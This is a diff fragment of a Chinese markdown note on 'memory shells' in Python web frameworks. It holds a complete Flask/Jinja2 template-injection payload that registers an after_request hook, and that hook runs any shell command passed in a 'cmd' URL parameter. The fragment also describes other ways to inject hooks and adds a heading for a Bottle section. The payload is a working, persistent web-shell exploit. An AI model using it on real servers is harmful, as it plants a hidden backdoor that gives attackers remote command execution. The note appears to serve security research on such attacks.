@@ -49,11 +49,6 @@ payload：
 ?name={{url_for.__globals__['__builtins__']['eval']("app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)",{'request':url_for.__globals__['request'],'app':url_for.__globals__['current_app']})}}
 ```
 
-  
-
-  
-
-  
 
   
 
@@ -64,3 +59,5 @@ https://www.cnblogs.com/gxngxngxn/p/18181936
 老版本中可以直接使用`app.add_url_rule`，可以通过把ture改掉，或者调用底层函数手动`app.add_url_rule`
 
 新版会使用after_request 和 before_request的底层函数，设置请求前要做的动作
+
+# bottle框架内存马
